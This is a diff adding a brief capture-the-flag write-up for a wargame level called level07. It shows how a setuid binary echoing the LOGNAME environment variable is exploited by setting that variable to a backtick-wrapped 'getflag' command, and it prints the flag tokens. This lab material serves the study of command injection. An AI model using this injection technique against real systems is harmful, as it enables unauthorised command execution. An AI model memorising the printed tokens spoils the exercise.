@@ -1,0 +1,14 @@
+wiok45aaoguiboiki2tuin6ub
+
+<- strings level07
+-> ....
+-> LOGNAME
+-> /bin/echo %s
+-> ....
+
+The functions get env value and echo his value.
+We see the env LOGNAME in use, so we'll just replace his value by our wanted syscall:
+
+<- export LOGNAME=\`getflag\`
+<- ./level07
+-> Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
